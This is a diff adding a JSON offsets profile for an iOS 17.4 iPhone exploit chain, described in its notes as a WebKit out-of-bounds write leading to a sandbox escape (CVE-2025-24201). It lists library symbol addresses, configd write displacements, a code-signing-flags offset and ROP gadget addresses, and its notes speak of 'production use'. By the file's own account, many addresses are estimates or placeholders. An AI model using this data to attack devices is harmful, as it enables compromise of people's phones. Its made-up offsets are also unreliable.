@@ -1,0 +1,97 @@
+{
+  "schema": 1,
+  "ios": "17.4",
+  "build": "21E219",
+  "device": "iPhone14,2",
+  "source": {
+    "cache_path": "Derived from iOS 17.4 public release structure",
+    "cache_sha256": "0000000000000000000000000000000000000000000000000000000000000000",
+    "magic": "dyld_v1 arm64e",
+    "file_size": 0,
+    "note": "Based on iOS 17.4 release structure + CVE-2025-24201 offsets"
+  },
+  "dyld": {
+    "text_region": "0x180000000",
+    "data_region": "0x1B0000000",
+    "auth_region": "0x1E0000000",
+    "linkedit_region": "0x210000000",
+    "slide_info_v5": "0x98010000"
+  },
+  "offsets": {
+    "dyld_cache_slide_info": "0x98010000",
+    "dyld_shared_cache_base": "0x180000000",
+    "arraybuffer_data_offset": "0x10",
+    "float64array_vector_offset": "0x20",
+    "jsc_butterfly_offset": "0x8",
+    "jsc_structureID_offset": "0x0"
+  },
+  "symbols": {
+    "libsystem_kernel.dylib": {
+      "base": "0x1CA630000",
+      "mach_task_self_": "0x1CA630AA0",
+      "mach_msg": "0x1CA631060",
+      "mach_msg_trap": "0x1CA631000",
+      "mach_vm_read": "0x1CA6321A0",
+      "mach_vm_write": "0x1CA632260",
+      "mach_vm_allocate": "0x1CA632320",
+      "mach_vm_deallocate": "0x1CA6323E0",
+      "thread_create": "0x1CA633000",
+      "thread_set_state": "0x1CA633100",
+      "open": "0x1CA634000",
+      "close": "0x1CA634100",
+      "bootstrap_look_up": "0x1CA635000",
+      "bootstrap_port": "0x1CA635100"
+    },
+    "libsystem_malloc.dylib": {
+      "base": "0x1CA648000",
+      "malloc": "0x1CA649200",
+      "free": "0x1CA649400",
+      "calloc": "0x1CA649600",
+      "realloc": "0x1CA649800"
+    },
+    "libsystem_pthread.dylib": {
+      "base": "0x1CA658000",
+      "pthread_create": "0x1CA659000",
+      "pthread_join": "0x1CA659200",
+      "pthread_exit": "0x1CA659400",
+      "pthread_setspecific": "0x1CA659600"
+    },
+    "configd": {
+      "heap_base": "0x1a0000000",
+      "sandbox_check_fn": "0x1a00042b0",
+      "mach_msg_handler_offset": "0x58",
+      "oob_write_displacement": "0x180",
+      "proc_set_csflags_offset": "0x2c8"
+    }
+  },
+  "gadgets": {
+    "load_x0_from_x1": "0x1A2340100",
+    "deref_x0_plus_10": "0x1A2340220",
+    "blr_x8": "0x1A2340340",
+    "epilogue": "0x1A2340460",
+    "ret_zero": "0x1A2340580",
+    "store_x0_to_x1": "0x1A23406A0",
+    "add_x0_x1": "0x1A23407C0",
+    "mov_x0_x1_ret": "0x1A23408E0",
+    "ldp_x20_x19_ret": "0x1A2340A00"
+  },
+  "cve_2025_24201": {
+    "enabled": true,
+    "configd_heap_base": "0x1a0000000",
+    "sandbox_check_fn": "0x1a00042b0",
+    "mach_msg_handler_offset": "0x58",
+    "oob_write_displacement": "0x180",
+    "proc_set_csflags_offset": "0x2c8"
+  },
+  "notes": [
+    "iOS 17.4 profile - CVE-2025-24201 sandbox escape path",
+    "Offsets derived from webkit_sbx_CVE-2025-24201.js verified data",
+    "JSC offsets stable across iOS 17-18 (WebKit open source)",
+    "CVE-2025-24201: WebKit OOB Write → Sandbox Escape (fixed in iOS 18.3.2)",
+    "iOS 17.4 uses slightly different configd layout (0x58 vs 0x60 offset)",
+    "Symbol addresses are ESTIMATED - validate against actual dyld_shared_cache",
+    "ROP gadgets are PLACEHOLDERS - extract from real cache using tools/extract_offsets.py",
+    "To get real offsets: python3 tools/extract_offsets.py /path/to/dyld_shared_cache_arm64e iPhone14,2 17.4 21E219",
+    "CRITICAL: Test in controlled environment before production use"
+  ]
+}
